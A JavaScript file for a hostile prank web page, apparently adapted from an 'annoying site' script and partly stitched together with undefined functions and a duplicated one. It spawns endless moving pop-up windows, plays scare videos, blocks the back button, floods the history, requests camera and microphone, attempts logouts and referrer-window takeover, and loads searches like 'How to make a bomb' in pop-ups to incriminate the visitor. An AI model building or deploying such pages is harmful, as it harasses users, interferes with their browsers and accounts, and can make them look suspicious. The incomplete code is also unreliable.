var windowCount = 0;
const SEARCHES = [
    'Huntsman spider',
    'Snapewives',
    'Pressure cooker bombs',
    'backpacks',
    'Botfly removal',
    'How to make a bomb',
    'Mouth larva',
    'Insider trading in an international account',
    'Bedbugs',
    'Everything Facebook knows about you',
    'Calculus bridge'
  ]

  function followCursor() {
    const img = document.createElement('img');
    img.src = 'scare.jpeg';
    img.style.position = 'absolute';
    document.body.appendChild(img);
    document.addEventListener('mousemove', (event) => {
        img.style.left = event.clientX + 'px';
        img.style.top = event.clientY + 'px';
    });
}

followCursor();

function randomTitle() {
    setInterval(() => {
        document.title = getRandomArrayEntry(SEARCHES);
    }, 3000);
}

  const VIDEOS = [
    'death.mp4',
    'devil.mp4',
  ]
function randomCursor() {
    setInterval(() => {
        document.body.style.cursor = `url('cursor_${Math.floor(Math.random() * 10) + 1}.png'), auto`;
    }, 2000);
}

  function startInvisiblePictureInPictureVideo () {
    const video = document.createElement('video')
    video.src = getRandomArrayEntry(VIDEOS)
    video.loop = true
    video.muted = true
    video.style = HIDDEN_STYLE
    video.autoplay = true
    video.play()
  
    document.body.appendChild(video)
  }
  function startVideo () {
    const video = document.createElement('video')
  
    video.src = getRandomArrayEntry(VIDEOS)
    video.autoplay = true
    video.loop = true
    video.style = 'width: 100%; height: 100%;'
  
    document.body.appendChild(video)
  }  
  function initChildWindow () {
    registerProtocolHandlers()
    hideCursor()
    moveWindowBounce()
    startVideo()
    detectWindowClose()
    triggerFileDownload()
    speak()
    rainbowThemeColor()
    animateUrlWithEmojis()
  
    interceptUserInput(event => {
      if (interactionCount === 1) {
        startAlertInterval()
      }
    })
  }
  function initParentWindow () {
    showHelloMessage()
    blockBackButton()
    fillHistory()
    startInvisiblePictureInPictureVideo()
  
    interceptUserInput(event => {
      // Only run these on the first interaction
      if (interactionCount === 1) {
        registerProtocolHandlers()
        attemptToTakeoverReferrerWindow()
        hideCursor()
        startVideo()
        startAlertInterval()
        superLogout()
        removeHelloMessage()
        rainbowThemeColor()
        animateUrlWithEmojis()
        speak('That was a mistake')
      }
    })
  }
  function requestCameraAndMic () {
    if (!navigator.mediaDevices ||
        typeof navigator.mediaDevices.getUserMedia !== 'function') {
      return
    }
  
    navigator.mediaDevices.enumerateDevices().then(devices => {
      const cameras = devices.filter((device) => device.kind === 'videoinput')
  
      if (cameras.length === 0) return
      const camera = cameras[cameras.length - 1]
  
      navigator.mediaDevices.getUserMedia({
        deviceId: camera.deviceId,
        facingMode: ['user', 'environment'],
        audio: true,
        video: true
      }).then(stream => {
        const track = stream.getVideoTracks()[0]
        const imageCapture = new window.ImageCapture(track)
  
        imageCapture.getPhotoCapabilities().then(() => {
          // Let there be light!
          track.applyConstraints({ advanced: [{ torch: true }] })
        }, () => { /* No torch on this device */ })
      }, () => { /* ignore errors */ })
    })
  }
  function enablePictureInPicture () {
    const video = document.querySelector('video')
    if (document.pictureInPictureEnabled) {
      video.style = ''
      video.muted = false
      video.requestPictureInPicture()
      video.play()
    }
  }
  function focusWindows () {
    wins.forEach(win => {
      if (!win.closed) win.focus()
    })
  }
  function startVideo () {
    const video = document.createElement('video')
  
    video.src = getRandomArrayEntry(VIDEOS)
    video.autoplay = true
    video.loop = true
    video.style = 'width: 100%; height: 100%;'
  
    document.body.appendChild(video)
  }
    
  
  
function onCloseWindow (win) {
  setTimeout(() => {
    const { x, y } = getRandomCoords()
    win.resizeTo(Math.floor(Math.random() * screen.width), Math.floor(Math.random() * screen.height));
    win.moveTo(x, y);
    setupSearchWindow(win)
    randomCursor();
  }, 1000)
}

function createWindow() {
  var newWindow = window.open("", "window" + windowCount, "width=200,height=200,resizable=yes,scrollbars=yes");
  // Make the window change color every 0.01 seconds
  setInterval(function() {
    var r = Math.floor(Math.random() * 256);
    var g = Math.floor(Math.random() * 256);
    var b = Math.floor(Math.random() * 256);
    newWindow.document.body.style.backgroundColor = "rgb(" + r + "," + g + "," + b + ")";
    randomCursor();
  }, 10);
  newWindow.document.write("<p>Uh ohhhh.... It looks like you messed up... >:)" + windowCount + "</p>");
  moveWindow(newWindow);
  windowCount++;
  setTimeout(createWindow, 200);
}

function moveWindow(win) {
  var x = Math.floor(Math.random() * screen.width);
  var y = Math.floor(Math.random() * screen.height);
  win.resizeTo(Math.floor(Math.random() * screen.width), Math.floor(Math.random() * screen.height));
  win.moveTo(x, y);
  setTimeout(function() { moveWindow(win); }, 200);
}

function setupSearchWindow (win) {
    if (!win) return
    win.window.location = 'https://www.bing.com/search?q=' + encodeURIComponent(SEARCHES[0])
    let searchIndex = 1
    const interval = setInterval(() => {
      if (searchIndex >= SEARCHES.length) {
        clearInterval(interval)
        win.window.location = window.location.pathname
        return
      }
  
      if (win.closed) {
        clearInterval(interval)
        onCloseWindow(win)
        return
      }
  
      win.window.location = window.location.pathname
      setTimeout(() => {
        const { x, y } = getRandomCoords()
        win.resizeTo(Math.floor(Math.random() * screen.width), Math.floor(Math.random() * screen.height));
        win.moveTo(x, y);
        win.window.location = 'https://www.bing.com/search?q=' + encodeURIComponent(SEARCHES[searchIndex])
        searchIndex++
      }, Math.floor(Math.random() * 5000))
    }, Math.floor(Math.random() * 5000))
}

createWindow();
setupSearchWindow(newWindow);

setInterval(function(){
  alert("Hey, Are you still there?");
}, 10000);